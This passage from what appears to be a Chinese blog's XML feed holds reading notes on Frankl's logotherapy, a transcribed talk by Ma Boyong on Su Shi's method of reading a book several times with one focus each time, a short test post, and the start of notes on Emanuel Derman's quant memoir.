发展过程中出现去的危机。</p><p>意义疗法的目的是帮助患者找到他生命的意义。在这个意义上讲，它类似于心理分析法。</p><p>意义疗法把人看作是这样的一种存在：他主要但哟偶是的是实现某种意义，而不仅仅是满足欲望和本能的需求，或者调和本我自我与超我之间的欲望的冲突抑或是适应社会和环境，在这点上，它与心理分析分道扬镳。</p><p><strong>心理——动力</strong><br>人对意义的追求会导致类型的紧张而非平衡。不过这种紧张恰恰是精神健康的必要前提。<br>尼采的一句话很有智慧“知道为什么而活的人，便能生存。”</p><p>精神健康有赖于一定程度的紧张——即已完成的和未完成的任务之间的紧张，或者是当下状态与理想状态之间的差距。<br>人实际需要的不是没有紧张的状态，而是为了追求某个自由选择的、有价值的目标而付出努力和奋斗。他需要的不是不问代价的消除紧张，而是某个有待他去完成的潜在意义的召唤。<br>人所需要的不是“内稳态”（指身体内部能够保持一定动态平衡，即不管外部环境如何变化，生物体的体内环境总是保持稳定。），而是“我”所谓的“精神动力”，也就是存在的动力处于一个紧张的极化区（其中一极代表有待完成的意义，另一极代表意义所期待的主体）</p><p><strong>存在之虚无</strong></p><p>在近期人类还遭受了另一种丧失，那就是原本作为其行为根基的传统迅速的消减。上市了告诉他必须做什么的本能，丧失了告诉他应该做什么的传统，有时人甚至连自己想做什么都不知道。这样，他要么去做别人所做的事（随大流），要么去做别人希望他做的事（集权主义）。</p><p>存在之虚无主要表现是厌倦。叔本华——人注定要徘徊在焦虑和厌倦这两极之间。</p><p>意源性神经官能症<br>心源性神经官能症<br>体源性神经官能症</p><p><strong>生命的意义</strong></p><p>生命的意义在每个人、每一天、每一刻都是不同的，所以重要的不是生命之意义的普遍性，而是在特定时刻每个人特殊的生命意义。</p><p>生命对每个人都提出了问题，他必须通过对自己生命的理解来回答生命的提问。对待生命，他只能担当起自己的责任。因此，意义疗法认为，负责任就是人类存在之本质。</p><p><strong>存在之本质</strong></p><p>对责任的强调反映在意义疗法的绝对命令中：”要像在经历第二次生命，仿佛你已经获得重生；再不要过得像过去那样，一定要避免犯同样的错误！”</p><p>意义疗法的作用是拓宽患者的视野，而不是事表达自己所见的世界是什么样子，使患者意识到其生命潜在的所有意义。</p><p>人要担任起责任，要实现生命的潜在意义，是想强调生命的真正意义要在世界当中而不是内心去发现，因为它不是一个封闭系统。作者将这种构成特点表述为“人类存在之自我超越”。它表明一个事实：人之所以为人，是因为他总是指向某种事物或某人（他自己以外的某人）——不论是作为有待实现的意义还是需要面对他人。人越是忘记自己——投身于某种事业或献身于所爱的人——他就越有人性，越能实现自己的价值。所谓自我实现，绝不是指某种可以实现的目标，因为人越是追求这个目标，越是容易失去它。换句话说，自我实现可能是自我超越的唯一的副产品。</p><p>作者提出按照意义疗法，可以用三种不同的方式来发现生命之意义：</p><ol><li>通过创立某项工作或从事某种事业；</li><li>通过体验某种事情或面对某个人；</li><li>在忍受不可避免的苦难时采取某种态度。</li></ol><p><strong>爱之意义</strong></p><p><strong>苦难之意义</strong><br>即使在看似毫无希望的境地，即使面对无可改变的命运，人们也能找到生命之意义。那时重要的是，能够见证人类潜能之极致，即人能够将个人的灾难转化为胜利，将个人的厄运转化为人类之成就。</p><p>但进一步强调，无论如何，痛苦都不是寻找意义的必要方式。如果痛苦是可以避免的，那么有意义的事就是去消除痛苦的根源，不论这种原因是心理的、生理的或政治的。遭受不必要的痛苦与其说是是英雄行为，不如说是自虐。</p><p>痛苦的不可避免还是永远也不会排除的。换句话手，生命之意义是无条件的，因为它甚至包括了不可避免之痛苦的潜在意义。</p><p><strong>意义治疗的心理剧</strong><br><strong>超级意义</strong></p><p>人需要做的，不是像某些存在主义哲学家所教导的那样去忍受生命的无意义，而是忍受自己不能以合理地方式去把握生命的无意义。意义比逻辑要深刻很多。</p><p><strong>生命之短暂</strong></p><p>使生命丧失意义的事情，不仅仅包括痛苦，还包括死亡。生命中真正短暂的是潜力，一旦潜力得到了实现，那么在实现的那一刻它就成为了现实。<br>我们存在的短暂性并不会使存在变得没有意义。但它的确构成了我们的责任，因为一切都取决于我们是否意识到必定短暂的可能性。</p><p>通常，人们只想到短暂性本身，而不去想它之前有过的丰富果实，他曾经历的快乐和痛苦，曾经做过许多事情。那一切都不会被否定，也不会被忘却。我应该说，“曾经存在”是最为确定的一种存在。</p><p>意义疗法因为牢记人类存在的短暂性，所以不是消极悲观的，而是积极向上的。<br><strong>作为一项技术的意义疗法</strong></p><p>意义疗法的“矛盾意向法”的技术源于以下两方面事实：<br>一方面，真实恐惧导致了所害怕的事情的出现；<br>另一方面，过度渴望使其所希望的事情变得不可能。<br>不过这种过程必须借助于人类特有的幽默感中的自我审视的能力。<br>戈登·W·奥尔波特在《个人与宗教》一书中说：“学会自嘲的神经官能症患者可能就学会了自我管理从而自愈。”<br>这是一种短期治疗方法。</p><p>打破恶性循环的，不是神经官能症患者的自我考量（无论是自我怜悯还是自我嘲弄），治疗的要义在于自我超越。</p><p><strong>集体性神经官能症</strong><br>现代的集体官能症——存在之虚无——可以表述为私人和个人的虚无主义，虚无主义认为生命毫无意义。</p><p>首先，关于人类“无谓”——即人不过是生物、心理和社会条件的产物，或是遗传与环境相结合的产物的理论是很危险的。它使神经官能症患者更愿意相信自己不过是外部影响的工具和牺牲品，认为人类不自由的心理治疗强化了这种神经官能症的宿命论。</p><p>当然，人的生命是有限的，自由也是有限的。人的自由不是无条件的自由，而是针对特定条件采取某种立场的自由。正像作者所说：“作为神经病学和精神病学两个领域的教授，我充分认识到生理、心理和社会的条件对于人的限制。但同时作为四个集中营的幸存者，我也亲眼见证了人在难以想象的最坏的境遇中勇敢面对和战胜各种厄运的能力。”</p><p><strong>对泛决定论的批评</strong></p><p>泛决定论——认为人应当无一例外的抛弃自己做出选择的能力的观点。</p><p>人是自己做出了是屈服与环境和条件还是勇敢挑战那些环境和条件的能力的决定，换句话说，人最终决定自己的命运。恩不是简单的活着，而是时时需要对自己的前途做出判断，决定下一刻自己会成为什么样的人。</p><p>同理，每个人都有随时改变自己决定的自由。但是个体性格仍然是无法预测的。任何预测必定要参照生理、心理和社会的条件。但是，人的生命的一个重要特点是，他有能力超越这些条件。人能够力所能及的改变世界，并在必要时完善自我。</p><p><strong>精神病学的信条</strong><br>没有任何事物能使人完全丧失自由，因此，无论是神经官能症还是精神病患者都拥有一定的机油，不管这些自由是多么的有限。精神疾病不可能触及患者的人格核心。</p><p>不可治愈的精神病患者也许没用，但他仍拥有人的尊严，这就是我的精神病学信条。</p><p><strong>精神病学的重归人性化</strong></p><p>长期以来精神病学试图将人的心理看作是一种机制，因此，对精神疾病的之力啊方法纯粹是在技术层面进行的。但是作者认为这是不符合实际的，一个医生认为自己是技术员，那他就等于承认自己眼中的病人是台机器，而不是患病的人。</p><p>人不是众多事物中的一种。事物相互决定对方，但人最终是自我决定，他成为什么——在天赋和环境的限度内——是他自己决定的结果。人最终表现出哪一种，是决定的结果，而不是环境的产物。</p><h4 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title="写在后面的话"></a><strong>写在后面的话</strong></h4><p><strong>为悲剧性的乐观辩护</strong></p><p>”悲剧性的乐观主义“指即使身处”三重悲剧“当中仍然并且一直保持乐观情绪。</p><p>“三重悲剧”——（1）痛苦（2）内疚（3）死亡</p><p>虽然生活充满了悲惨因素，但它如何能够保持潜在意义？总之，“面对生活中的一切，仍然对生活说‘是’。’”<br>重要的是如何充分利用任何给定的处境，面对灾难而保持乐观。<br>人类总有能力（1）将生活的苦难转化为成就（2）从罪过中提炼改过自新的机会（3）从短暂的生命中获取负责任的行动和能力。</p><p>乐观不是通过命令就能获取的。<br>大量证据表明，三大症状——抑郁、侵犯和成瘾依赖——都是由于意义疗法中的“存在之虚无”即空虚感和无意义导致的。</p><p>只有濒死之时人们才能揭示生命的全部意义，而这种终极意义也有赖于生命过程中尽其所能地实现每个单一情境的潜在意义。</p><p>意义对于意义的认识是完全存在的，而不是虚无缥缈的。</p><p>作者对意义的认识——个人对特定情境的认识——介于卡尔·布勒尔概念中的“阿哈体验”与马克斯·维黑莫尔理论中“完形概念”的中间地带。对意义的认识与经典的“完形”不同。而对意义的认识在我看来最实在不过，就是意识到了现实背景下的某种可能性，或者通俗地说，意识到在给定情境下“能够做些什么“</p><p>意义疗法认为，良知是一种提示器，能够指示我们在特定情境中前进的方向。为了完成这样的任务，良知必须仔细衡量所处情境，按照一套标准和价值系统去评价它。但是，这些价值不能在意识层面上被我们发掘和采用，它们就是我们本来的面目。它们在人类进化的过程中积淀下来，以生物进化为基础，植根于生物学深处。康拉德·洛伦兹可能抱有类似的想法，他曾提出“生物学优先”的概念，当讨论作者关于价值形成过程之生物性基础的观点时，他饶有兴趣地表达了自己的共鸣。无论如何，假如价值论的自我理解是存在的，我们可以假定它就存在于我们的生物学遗传之中。</p><p>意义疗法认为找到生命之意义有三个主要途径。第一是创造或从事某种工作。第二是经历某种事情或者面对某个人，爱迪思·威斯科普夫-焦尔森就发现意义疗法中“体验同成功一样都具有价值的观，是具有治疗作用的，因为它纠正了我们过度强调以内心经验为代价而获得外部成功的做法”。不过，最重要的是第三个途径：即使是处于绝境的无助受害人，面对无法改变的厄运，仍能自我超越，并且以此改变自己。他能够把个人悲剧转化为胜利。</p><p>实际上，正确行事的机会和实现某种意义的潜在可能性都受到我们的生命之不可逆转性的影响。但同时，那种潜在可能性本身也受到这种影响。一旦我们利用了某个机会，实现了某种意义，我们就把事情办成了。我们将它拯救到过去，让它安全地保存在过去之中。</p><p>（犬儒主义：古希腊四大学派之一，主张清心寡欲，鄙视荣华富贵，力倡回归自然。）</p>]]></content>
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>看不进书是常态，看得进才是变态</title>
      <link href="/2018/07/30/%E7%9C%8B%E4%B8%8D%E8%BF%9B%E4%B9%A6%E6%98%AF%E5%B8%B8%E6%80%81%EF%BC%8C%E7%9C%8B%E5%BE%97%E8%BF%9B%E6%89%8D%E6%98%AF%E5%8F%98%E6%80%81/"/>
      <url>/2018/07/30/%E7%9C%8B%E4%B8%8D%E8%BF%9B%E4%B9%A6%E6%98%AF%E5%B8%B8%E6%80%81%EF%BC%8C%E7%9C%8B%E5%BE%97%E8%BF%9B%E6%89%8D%E6%98%AF%E5%8F%98%E6%80%81/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>马伯庸是著名的作家，曾经获得人民文学奖、朱自清散文奖、银河奖、有“文字鬼才”之誉，评为“沿袭五四以来历史文学创作的谱系”。</p><p>文字风格充满奇趣，代表作有《长安十二时辰》、《古董局中局》、《三国机密》、《草原动物园》等。</p><p>“无可救药的阅读焦虑症——年怕中秋月怕半，读书减肥不怕晚”。<br><a href="https://mp.weixin.qq.com/s/0pBLqH_WRSci62C3fWx1ng" target="_blank" rel="noopener">原文链接</a><br><a id="more"></a></p><h1 id="无可救药的阅读焦虑症"><a href="#无可救药的阅读焦虑症" class="headerlink" title="无可救药的阅读焦虑症"></a>无可救药的阅读焦虑症</h1><p><strong>演讲：马伯庸</strong></p><h3 id="1-“能阅读下去才是反常和变态”"><a href="#1-“能阅读下去才是反常和变态”" class="headerlink" title="1 “能阅读下去才是反常和变态”"></a>1 “能阅读下去才是反常和变态”</h3><p>“阅读焦虑症”——在等飞机、等地铁、等公车，甚至有时候骑自行车等红灯的时候都要掏出手机，如果没有手机的话就看附近的广告，看附近的报纸。在洗手间上厕所的时候，一旦手机没在身边怎么办呢？就找牙膏，读牙膏上的说明，或者是找洗洁精，读洗发水上面的牌子，英文的最好，因为那个读得慢。</p><p>人们的眼睛必须在不停地看东西，不看东西我就陷入一种特别无聊然后非常惊慌的一个状态。</p><p>第一，是好事，可以让人来读更多的东西。第二，也不是好事，因为它让人始终处于一种去看的状态，但看并不代表你能够吸收，有时看只是为了缓解自己的一种焦虑症。</p><blockquote><p>不论年龄大小，统一都会问到一个问题，我们很想读书，但是我每次读书都会觉得困。</p></blockquote><p>首先看不进去书是一个非常正常的现象。阅读、看不下去书是一个太正常不过的事情。能阅读、看得下去书才是反常，才是变态。</p><p>因为小说它讲的是一个故事，它是一条直线，所以我们都看得下去。</p><p>但真正的历史并不是这样，它完全是散碎的，一堆线头，像是很多人写的日记，它是流水帐，东一榔头西一棒子，虽然中间可能存在着一定的规律，但是我们普通人很难把它提炼出来。</p><h3 id="2-“苏轼人到六十岁还在做关于读书的恶梦”"><a href="#2-“苏轼人到六十岁还在做关于读书的恶梦”" class="headerlink" title="2 “苏轼人到六十岁还在做关于读书的恶梦”"></a>2 “苏轼人到六十岁还在做关于读书的恶梦”</h3><p>现在很少有人会把《三国志》读完，就在于它的故事性太差读不下去，咱接下来就来讲一个苏轼轶事。</p><p>苏轼大家都知道，用现在的话讲就是当时的大V，写什么东西马上会被转发，但是苏轼小时候一样不爱读书，到什么程度呢？苏轼到儋州都60多岁了，还在因为读书做恶梦呢。</p><p>海南环境非常恶劣，瘴气浓，气候不好，他在60多岁被贬海南时，做了一个很有意思的恶梦，名字叫《儋州夜梦》，当时海南叫“儋州”。《儋州夜梦》中他梦见了什么呢？</p><p>“夜梦嬉游童子如”，说我做梦回到小时候了，每天在玩，嬉游嘛，像小孩一样到处在玩。</p><p>“父师检责惊走书”，就是他爸，苏洵，苏洵要检查他的功课，检查他有没有读书，结果呢？苏轼的反应是什么？惊走书，吓坏了，说明他小时候也不是一个好孩子。</p><p>“计功当坒春秋余”，意思是他爸给他留的作业，就是说你要把《春秋》读一遍，《春秋》那书特别难读。</p><p>它讲的是鲁国历史，春秋大义，里面每一个字都暗含褒贬。这本书对小孩来说太难了。</p><p>“今乃始及桓庄初”。什么意思呢？《春秋》这本书讲的是鲁国12位君王，他爸要他把这本书读完，而他刚看完四分之一。</p><p>“怛然悸寤心不舒，起坐有如挂钩鱼。”是说，没读完呐，吓得心脏病都快要犯了，坐在椅子上坐立不安，就好像被人一个鱼钩挂在嘴上一样。</p><p>所以说到这儿，大家心里可以踏实一点儿了，以苏轼的天赋，到60岁了还在做关于读书的恶梦，我读不完书我爸该骂我了，你想他的心理阴影面积得有多大？</p><p>我们要知道苏轼，他虽然有天分，但是他那会儿读书不得法，完全坐不下去读书。</p><p>后来呢？“弃书事君四十年”，我来从政了，我在政坛待了40年。“仕不顾留书绕缠”，当官没当好，但是书一直在读。</p><p>“自视汝与丘孰贤”这句话他用了一个典故，你和孔子之间到底谁读书读的多？他自问一句。</p><p>“易韦三绝丘犹然”，这是涉及到一个典故——韦编三绝。孔子读书非常辛苦，非常勤劳，他每次翻竹简翻得韦编断过三次或者断过很多次，这个“三”可以是当多数讲，苏轼说我比孔子读的勤劳，而且我比他读得勤劳，为什么呢？</p><p>是因为你看“如我当以犀革编”，就是他用的是兽皮编的书，所以容易断，我拿犀牛皮搁在上，所以我这个书不会断。</p><p>说明苏轼在读书这一点上非常自信，连孔夫子都比不过他，他读书甚至要用犀牛皮来串这个东西。</p><h3 id="3-“功利说明读起书来有目标”"><a href="#3-“功利说明读起书来有目标”" class="headerlink" title="3 “功利说明读起书来有目标”"></a>3 “功利说明读起书来有目标”</h3><p>那苏轼到底是怎样克服童年阴影，成为一代大家的呢？</p><p>他有一个弟女婿说是要读完天下书，苏轼特别爱显摆啊，就详细的把他读书的办法讲给他听，我们很幸运，这封信留了下来。</p><p>“卑意欲少年为学者”，他说啊，你们年轻人想要读书，应该“每一书皆作数过尽之”，每一本书多读几遍。</p><p>“书富如入海，百货皆有，人之精力,不能兼收尽取”就是说知识的海洋太广阔了，里边什么知识都有你不可能一个人都读完的。</p><p>所以我们作为人想去读的话怎么办呢？“但得其所欲求者尔”。这句话很关键，就是说我们读书要找到我们想得到什么东西。</p><p>所以“故愿学者每次作一意求之”。就是说你每次给自己设定一个目标。</p><p>“如欲求古今兴亡治乱、圣贤作用，但作此意求之，勿生余念”，比如说我们今天拿到一本书，我们该怎么读呢？</p><p>我们想了解古今兴亡治乱、圣贤作用，是看历史人物在历史中发挥的作用，我们这边就关心这件事情，其它不要管。</p><p>把这遍读完之后，“又别作一次，求事迹故实典章文物之类”，每一遍都是一个目标，有事迹，有故事，有典章，有文物。</p><p>他皆仿此。此虽迂钝，而他日学成，八面受敌，与涉猎者不可同日而语”。是说你学会这个读书法以后，比那些浅尝辄止的读书人要强很多。</p><p>简单通俗的来讲，就是说我们在读书的时候要功利一点，读书稍微功利一点是好的，功利就意味着读书时你要有一个目标，你要有所求。</p><p>虽然现在很多心灵鸡汤都会说，读书要尽兴，要随性。就是说我们读书时不能功利，不能为了什么去读书。但是，你把读书的目标设立之后，再去读书，远比你漫无目标的翻一本书效率要高得多。</p><p>举个例子，你现在一本刚才看的《三国志》，你在地铁上肯定看不下去，因为你不知道该看什么。</p><p>我有一个认识的女生，她特别喜欢里面的赵云，她会把《三国志》里面关于赵云的东西全部搬出来，重读一遍，强大的爱支撑她把这本书读完了。</p><p>她还结识了一个更厉害的女生，她支持赵云和诸葛亮组CP，这个力量就更加强大了，她不光自己读，还把它写成同人文，她认为把自己内心的目标实现，就觉得动力十足。</p><p>苏轼是说“求事迹故实典章文物”，所以，只要你有一个目标在那儿，这本书你读起来就比你没有目标去读书要痛快得多。</p><p>回头来看《三国志》，咱们第一次只关心蜀国的故事，下一次再关心魏国的，这就是“典章故实文物”，找准目标了，其他的我不管。</p><p>第一这样看得很快，可以把无关紧要的东西略掉。第二，有明确的目标后，就会把这个目标了解清楚，反复推敲。这就会是“与涉猎者不可同日而语”。</p><p>一个英文谚语说，“如果一个船你不知道去哪个港口的话，那么任何一个方向的风对你来说都是逆风”，其实读书也一样。如果你读书不知道你的目标是什么，你翻开每一页都是催眠的。</p><h3 id="4-“阅读就像打群架，找准一个突破口”"><a href="#4-“阅读就像打群架，找准一个突破口”" class="headerlink" title="4 “阅读就像打群架，找准一个突破口”"></a>4 “阅读就像打群架，找准一个突破口”</h3><p>苏轼把这种读书法命名叫做八面受敌，什么叫八面受敌？八面受敌的意思就是一大群敌人，就好像打架的时候，四五个小混混围着你，你跑不了又没办法叫人，你怎么办呢？</p><p>第一种办法是，你抱着头挨打就得了，反正打不死，打完之后拍拍土回家哭去。第二种办法是，四五个混混过来，你就盯着其中一个人打，甭管别人是拿砖头砸你，还是后面踢你，你就盯着一个人狠揍。</p><p>一直揍到这个人气急败坏说你干嘛光砸我，别人打你，为什么光打我？这个时候他就会去主动帮你去劝别人不要打了。因为别人打我更狠，我就打他更狠。</p><p>打架和读书的道理是一样的，“八面受敌读书法”什么意思？八面，就是一本书里面有四面八方的知识向我涌过来，怎么办呢？</p><p>我就盯着一点，我就盯着这一个地方，把它读完，凭你几路来，我只一路去。打完这一路再攻克另外一路，而且，读书不是打架，读书不疼啊。</p><h3 id="5-“古书难读？四遍看穿《鸿门宴》”"><a href="#5-“古书难读？四遍看穿《鸿门宴》”" class="headerlink" title="5 “古书难读？四遍看穿《鸿门宴》”"></a>5 “古书难读？四遍看穿《鸿门宴》”</h3><p>苏轼最喜欢的一本书是《汉书》，其中包括治道、人物、官制、兵法、货财。那他是怎么把这本书读透的呢？</p><p>第一遍，我读政治，有关于汉代政治变化。</p><p>第二遍我光读人物，中间都讲到了哪些历史人物。</p><p>第三遍我读官制。比方说三公九卿到底怎么回事？</p><p>其他的我一概不管。</p><p>所以每次读一遍，就一心一意去关注一个事，只关心一个层面的东西</p><p>这样几个回合下来，基本山就能把《汉书》吃透了。</p><p>说那么多，咱们现在来实操一次，《史记》中有一个著名的例子《鸿门宴》，用苏轼的“八面受敌读书法”来读这个东西，到底该怎么读？</p><blockquote><p>► 第一遍读史实<br>史实很简单，沛公跑来见项王，到了鸿门这个地方后，中间就是整个过程，还有“项庄舞剑，意在沛公”，最后是被拦住，然后刘邦跑了。  </p><p>► 第二遍读地理<br>这次咱们不关心它整个具体的过程，我们要关心的是所有涉及到地理方面的东西。比如说鸿门到底在哪儿？<br>打开地图就会发现鸿门这个位置离西安很近，所以项羽把宴设在鸿门，想的就是，你一旦令我不满意了，我的大军随时可以攻入咸阳。<br>所以我们读透地理后就能明白，为什么《鸿门宴》中，刘邦灰溜溜地过来见项羽，而且把姿态摆得特别低。  </p><p>► 第三遍读礼制<br>《鸿门宴》上的座次，项羽、项伯朝东坐，亚父范增朝南坐，而他们特意把刘邦安排朝北坐，这个是为什么？这个涉及到当时的特别讲究的礼制问题。<br>大家都知道，朝东是“东道主”，项羽在这里直接就显示了主人的地位，他其实是在跟刘邦说啊，这个地盘是我的。<br>范增，朝南坐。这其实是一个尊贵客人的位置。<br>现在回头来看刘邦，朝北坐，说白了，这里就是一个上菜口。来者是客，这就是项羽在故意羞辱他。<br>从座次我们就能看得出来，这个位置已经是杀机四伏了。说明项羽对他是既不屑又很愤怒，随时可能要杀掉他。  </p><p>► 第四遍读器物<br>“范增数目项王”，就是范增冲项羽使眼色，告诉他赶紧把刘邦干掉，“举所佩玉玦以示之者三”。但是他又不能明说，就拿出自己的玉玦。<br>玉珏这个东西，比玉佩中间缺了一块。代表君子有决断之德，说你是一个有决断力的人，同时是说你要尽快下决断。  范增拿出玉珏暗示项羽，现在就把他干掉，你赶紧安排上啊。</p></blockquote><p>史实、地理、礼制、器物，每一遍读的东西都不一样，每个关注点都不同。</p><p>这样就把座位的氛围，每个人的举动，了解得一清二楚。</p><p>就像看一个电影剧本一样。如果是草草读过一遍，可能就知道刘邦很幸运，幸运地倒躲过了杀机逃掉，只知道这一件事，其它什么都不知道。</p><h3 id="6-“勤能补拙、厚积薄发”"><a href="#6-“勤能补拙、厚积薄发”" class="headerlink" title="6 “勤能补拙、厚积薄发”"></a>6 “勤能补拙、厚积薄发”</h3><p>最后还要提醒一下，苏轼给他弟女婿讲完这个东西之后，还提醒了一句。叫“甚非速化之术，可笑可笑”。什么意思呢？</p><p>读书法不是捷径，它只是入门的方法论。</p><p>我们还是需要有大量的时间认真去看，鞭策自己去读，才能有所得。</p><p>真正的读书其实还是一个长年累月的积累，所以是“甚非速化之术”。</p><p>有一个关于苏轼的现身说法。</p><p>在黄冈时，有一个叫朱载上的朋友去拜访他被门童拦住了。门童说：“我们家老爷在做功课呢。”</p><p>一个小时后苏轼把他接进来，朱载上就质问苏轼：“你干嘛呢你？这么长时间，让我等这么半天” 。</p><p>苏轼说我在默写汉书，我在抄汉书。朱载上就惊了，他说《汉书》你还用抄，从小看到大，已经这么了解了。</p><p>苏轼就回答他，每天抄一段汉书，这是我的日常工作啊，不信你来考我。</p><p>你随便在《汉书》里翻四个字告诉我，我能把后面全写下来。</p><p>朱载上不信，随便摘了四个字，苏轼就往后面，一口气背了一百多段。</p><p>朱载上又挑了三个字，接着又选了两个字，苏轼都一下子都给背出来了。</p><p>可朱载上也调皮啊，非要说一个字，苏轼立马就把他赶走了，这就有点过分了。</p><p>后来朱载上回家以后，就跟他儿子就感慨，他说你说苏轼这么一个天才的人，都这么下苦功夫，咱们这种中人之姿是不是更应该努力？</p><p>今天给大家分享这个读书法，不是告诉大家说有什么简单的、迅速的速成之术，没有，我现在特别烦，就是看那些十分钟了解欧洲史，半个小时读懂唐朝，或者是十天什么就可以读懂。</p><p>我觉得那些速成之法，其实是有点害人的。真正的你要去想了解一个东西，想读透一本书的话，真正还要靠自己的勤奋，而不是靠一些取巧的办法。</p><p>所以说我希望大家这次听完以后，回去可以试着给自己找一个目标，看看自己能不能把这本书读进去，我相信对大家应该是有所帮助的。</p>]]></content>
      
      <categories>
          
          <category> Essay </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>欢迎来到我的博客</title>
      <link href="/2018/07/30/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/07/30/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这里写摘要。test<br><a id="more"></a></p><p>这是我的第一篇博文，测试用。</p>]]></content>
      
      <categories>
          
          <category> Sports </category>
          
          <category> Baseball </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主题测试 </tag>
            
            <tag> Injury </tag>
            
            <tag> Fight </tag>
            
            <tag> Shocking </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>宽客人生：从物理学家到数量金融大师的传奇</title>
      <link href="/2018/07/30/%E5%AE%BD%E5%AE%A2%E4%BA%BA%E7%94%9F%EF%BC%9A%E4%BB%8E%E7%89%A9%E7%90%86%E5%AD%A6%E5%AE%B6%E5%88%B0%E6%95%B0%E9%87%8F%E9%87%91%E8%9E%8D%E5%A4%A7%E5%B8%88%E7%9A%84%E4%BC%A0%E5%A5%87/"/>
      <url>/2018/07/30/%E5%AE%BD%E5%AE%A2%E4%BA%BA%E7%94%9F%EF%BC%9A%E4%BB%8E%E7%89%A9%E7%90%86%E5%AD%A6%E5%AE%B6%E5%88%B0%E6%95%B0%E9%87%8F%E9%87%91%E8%9E%8D%E5%A4%A7%E5%B8%88%E7%9A%84%E4%BC%A0%E5%A5%87/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>当你研究物理学的时候，你的对手是上帝；当你研究金融学时，你的对手是上帝创造的人类。</p><p>——伊曼纽尔.德曼<br><a id="more"></a></p><p><img src="/2018/07/30/宽客人生：从物理学家到数量金融大师的传奇/宽客人生.jpg" style="zoom:50%"></p><p>序言 两种文化</p><p>宽客从事的主要工作的是“金融工程“（quantitative finance），这个学科是跨学科的混合体，包括物理学模型、数据技巧和计算机科学等，目的是为了对金融证券进行估值。最佳的数量金融学时间洞察了证券价值与不确定性之间的关系，并接近真正的科学；糟糕的实践则是缺乏有效论证的复杂数学模型的伪科学大杂烩。</p><p>物理学家大批涌入其他领域就职的部分原因在于，20世纪70年代他们传统的就业市场——学术领域工作萎缩了。……</p><p>最成功的的理论<br>目前金融世界中最著名也是应用最广泛的模型就是布莱克-斯科尔斯（Black-Scholes）期权定价模型。</p><p>第一章 因缘际会</p><p>1965年末</p><blockquote><p>尽管为了完成博士论文花费了很长时间，但我并没有真的遗憾过；从某种程度上来讲，我为其中的努力而骄傲。我在那些年学到的东西——百折不挠的韧性和数学知识，对我无论是在华尔街还是在学术界都非常有帮助。在任何领域内，只要有人先验发现新大陆，他就要花费多年去思考、不断试错。在歧途中徘徊、在误区中跌跌撞撞，最终还要站起来继续前行。从这个角度来说，获得博士学位是一个很好、很痛苦的过程。</p><p>尽管我把大部分的精力都花在物理上，但整整奋斗了7年才得以被人注意。我用爱因斯坦67岁写在自传体笔记中的几句话来安慰自己，这几句话是关于他参加期末考试所带来的后续影响的，“（对于我来说）这种强迫具有一种阻碍作用，我发现通过期末考试之后，我在真正一年内对任何科学问题的思考都让我觉得反感。“</p><p>博士后生活是一种“返祖现象”，是很久以前一个时代留下的印迹。创设博士后研究职位是为了给那些已经研究生毕业但还没有当上教授的人提供一个短暂的过渡。但在苏联抢先发射卫星上天后，美国将科学看成是精神上同苏联的另一场战争，结果就是产生了大量年轻科学家，这些科学家已经取得了终身教职，而且他们至少在30年内不可能退休。教师需要学生，于是就鼓励有抱负的物理学研究者进入博士生培养流程，但当这些学生从教育流程末端涌现出来的毕业的时候，几乎没有地方可去了。博士后职位暂时填补了这一空缺，只需要两年时间，而且报酬微薄。但这种机制对大学而言非常有效，大学每年都能新招收一批年轻的物理学研究者，一旦有空缺出来的教师职位，大学就可以在这群年轻的学者中挑选非常出色的人来填补。</p><p>我的一些博士朋友，对留在物理学界从事研究充满热情且基督热爱，即使拿不到任何薪水，成为“免费赠品”（freebies）。这个词表示那些在任何地方都没有找到工作，于是在一流研究机构中申请一张桌子和基本研究设备、不要求任何报酬做研究的人。他们这么做的目的就是处在一个激励人的环境中，与其他学者保持紧密的联系，然后完成一篇足以让他们获得带薪职位的论文。甚至我有一个朋友，居然拒绝了一份二流学术机构提供给他的带薪博士后的职位，而成为哈佛大学的“免费赠品”。在哈佛，他顺利完成了一些研究，这些研究使他得到了一流研究机构——斯坦福大学加速器中心的带薪职位。</p></blockquote><p>人智学会（Anthropological Society）《更高世界的知识》<br>《弗洛伊德与人的灵魂》<br>史代纳</p><blockquote><p>就像艺术和音乐的美通常出自于在已接受的框架的限制内创造新事物的张力一样，很多理论物理学的深刻理论都来自于非常通用的指导原则限制下试图描述自然界的法则。如果一个人非常幸运又非常聪明，通用指导原则将排除其他一切，只剩下一个真实的理论。</p><p>我形单影只的个人生活强化了理论物理学家和学者研究工作的孤独感。为了进行持续的研究或计算，你可能老是拿脑袋往墙上撞，试图压制需要人陪伴的想法。我厌恶独处，并羡慕那些日常工作中可以和其他人打交道的人。多年以后，我发现宽客的日常生活十分富足且不像学者生活那么孤单。可以想象出作为宽客每天的工作：要与其他宽客讨论，阅读理论，与交易员交流，进行软件编程，与客户谈话，向聪明但不懂数学的交易员讲解=复杂的概念。直到我经历了这种生活，我才开始相信投资银行比大学还想大学。</p><p>根据托尔斯泰的说法，“业‘是指有着因果关系的对罪孽的赎罪行为，就在那时我想我想明白了”业“的含义。命运要你放弃虚荣、野心和奥曼，来信奉”上帝“。心甘情愿地主动做这件事是最好的。但如果你没有，那么”业“，也就是命运日常的运行方式，就会慢慢地、固执地磨平你的虚荣，剥掉你虚荣与自以为是的外衣，就像自动削皮机中的土豆一样，直到你听命为止。</p